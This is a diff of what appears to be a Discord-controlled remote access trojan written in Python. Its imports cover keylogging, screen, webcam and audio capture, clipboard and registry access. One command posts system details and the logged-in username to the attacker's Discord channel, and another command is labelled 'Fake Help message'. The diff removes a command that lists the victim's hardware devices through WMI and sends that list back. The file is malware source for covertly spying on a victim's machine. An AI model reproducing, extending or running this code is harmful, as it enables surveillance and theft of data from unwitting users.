@@ -1,6 +1,6 @@
 DEV = "tilov"
 
-import shutil, tkinter as tk, winreg as reg, sounddevice as sd, numpy as np, os, platform, time, win32gui, win32con, win32com.client, ctypes, binascii, discord, discord.ext, subprocess, requests, sys, asyncio, keyboard, winreg, pyaudio, threading, pyttsx3, pyperclip, multiprocessing, tempfile, cv2, io, aiohttp, random, difflib, pymsgbox, ctypes.wintypes, time, inspect
+import shutil, tkinter as tk, winreg as reg, sounddevice as sd, numpy as np, os, platform, time, win32gui, win32con, ctypes, binascii, discord, discord.ext, subprocess, requests, sys, asyncio, keyboard, winreg, pyaudio, threading, pyttsx3, pyperclip, multiprocessing, tempfile, cv2, io, aiohttp, random, difflib, pymsgbox, ctypes.wintypes, time, inspect
 from discord.ext import commands, tasks
 from PIL import ImageGrab
 from pynput.keyboard import Listener
@@ -386,38 +386,6 @@ async def specs(ctx):
     system_specs += f"Logged-in User: {os.getlogin()}\n"
 
     await send_embed_message(ctx.channel, system_specs)
-
-def list_devices():
-    try:
-        wmi = win32com.client.Dispatch("WbemScripting.SWbemLocator")
-        service = wmi.ConnectServer(".", "root\cimv2")
-        devices = service.ExecQuery("SELECT * FROM Win32_PnPEntity")
-
-        if len(devices) == 0:
-            return "No devices found."
-
-        device_list = []
-        current_length = 0
-        for device in devices:
-            if device.Name:
-                if len(device.Name) + current_length <= 1900:
-                    device_list.append(device.Name)
-                    current_length += len(device.Name)
-                else:
-                    break
-
-        if len(device_list) == 0:
-            return "No devices found."
-
-        formatted_devices = "\n".join(device_list)
-        return f"Available devices:\n{formatted_devices}"
-    except Exception as e:
-        return f"An error occurred: {str(e)}"
-
-@bot.command(help="list devices")
-async def devices(ctx):
-    response = list_devices()
-    await ctx.send(response)
 
 @bot.command(help="Fake Help message")
 async def help(ctx):
